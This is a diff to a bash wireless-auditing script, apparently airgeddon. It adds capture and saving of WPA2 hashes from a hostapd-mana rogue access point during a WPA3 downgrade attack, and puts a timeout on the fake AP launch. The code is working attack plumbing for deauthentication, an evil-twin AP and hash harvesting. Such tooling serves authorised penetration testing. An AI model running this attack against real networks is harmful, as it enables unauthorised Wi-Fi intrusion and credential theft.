@@ -8488,6 +8488,27 @@ function manage_asking_for_rule_file() {
 	fi
 }
 
+#Check if a hash is present in hostapd-mana log
+function check_mana_hashes() {
+
+	debug_print
+
+	mana_hash=""
+
+	while true; do
+		if grep -Eqim1 '^MANA WPA2 HASHCAT' "${tmpdir}${hostapd_mana_log}"; then
+			mana_hash=$(grep -Eim1 '^MANA WPA2 HASHCAT' "${tmpdir}${hostapd_mana_log}" | awk -F "\|" '{print $2}' 2> /dev/null | tr -d " ")
+			break
+		fi
+
+		if ! ps -p "${hostapd_mana_pid}" > /dev/null 2>&1; then
+			break
+		fi
+
+		sleep 3
+	done
+}
+
 #Validate the file to be cleaned
 function check_valid_file_to_clean() {
 
@@ -9391,6 +9412,41 @@ function manage_aircrack_pot() {
 	fi
 }
 
+#Check if hashes were captured during WPA3 downgrade attack
+function manage_mana_pot() {
+
+	debug_print
+
+	if [ -n "${mana_hash}" ]; then
+		echo
+		language_strings "${language}" 530 "yellow"
+
+		ask_yesno 785 "yes"
+		if [ "${yesno}" = "y" ]; then
+			downgrade_potpath="${default_save_path}"
+			downgradepot_filename="wpa3-downgrade-hash-${bssid}.txt"
+			downgrade_potpath="${downgrade_potpath}${downgradepot_filename}"
+
+			validpath=1
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "downgradepot"
+			done
+
+			{
+			echo "${mana_hash}"
+			} >> "${downgradepotenteredpath}"
+
+			echo
+			language_strings "${language}" 786 "blue"
+			language_strings "${language}" 115 "read"
+		fi
+	else
+		echo
+		language_strings "${language}" 788 "red"
+		language_strings "${language}" 115 "read"
+	fi
+}
+
 #Check if the password was decrypted using asleap against challenges and responses
 function manage_asleap_pot() {
 
@@ -10225,11 +10281,10 @@ function exec_wpa3_downgrade_attack() {
 	set_hostapd_mana_config
 	launch_fake_mana_ap
 	exec_wpa3_downgrade_deauth
-
-	#TODO check if captured
-
+	check_mana_hashes
 	kill_wpa3_downgrade_attack_processes
 	restore_wpa3_downgrade_interface
+	manage_mana_pot
 	clean_tmpfiles
 }
 
@@ -10870,11 +10925,11 @@ function launch_fake_mana_ap() {
 
 	rm -rf "${tmpdir}${hostapd_mana_log}" > /dev/null 2>&1
 	recalculate_windows_sizes
-	manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g1_topright_window} -T \"AP\"" "hostapd-mana \"${tmpdir}${hostapd_mana_file}\" | tee ${tmpdir}${hostapd_mana_log}" "AP"
+	manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g1_topright_window} -T \"AP\"" "timeout -s SIGTERM ${timeout_wpa3_downgrade} hostapd-mana \"${tmpdir}${hostapd_mana_file}\" | tee ${tmpdir}${hostapd_mana_log}" "AP" "active"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		hostapd_mana_pid=$!
 	else
-		get_tmux_process_id "hostapd-mana \"${tmpdir}${hostapd_mana_file}\""
+		get_tmux_process_id "timeout -s SIGTERM ${timeout_wpa3_downgrade} hostapd-mana \"${tmpdir}${hostapd_mana_file}\""
 		hostapd_mana_pid="${global_process_pid}"
 		global_process_pid=""
 	fi
@@ -13825,6 +13880,10 @@ function validate_path() {
 		fi
 
 		case ${2} in
+			"downgradepot")
+				suggested_filename="${downgradepot_filename}"
+				downgradepotenteredpath+="${downgradepot_filename}"
+			;;
 			"wpa3pot")
 				suggested_filename="${wpa3pot_filename}"
 				wpa3potenteredpath+="${wpa3pot_filename}"
@@ -14000,6 +14059,15 @@ function read_path() {
 
 	echo
 	case ${1} in
+		"downgradepot")
+			language_strings "${language}" 787 "green"
+			read_and_clean_path "downgradepotenteredpath"
+			if [ -z "${downgradepotenteredpath}" ]; then
+				downgradepotenteredpath="${downgrade_potpath}"
+			fi
+			downgradepotenteredpath=$(set_absolute_path "${downgradepotenteredpath}")
+			validate_path "${downgradepotenteredpath}" "${1}"
+		;;
 		"wpa3pot")
 			language_strings "${language}" 762 "blue"
 			read_and_clean_path "wpa3potenteredpath"
@@ -15363,8 +15431,6 @@ function wpa3_downgrade_prerequisites() {
 		language_strings "${language}" 115 "read"
 		return
 	fi
-
-	#TODO create some function to invoke it here to manage log (similar to manage_ettercap_log)
 
 	if [ "${is_docker}" -eq 1 ]; then
 		echo
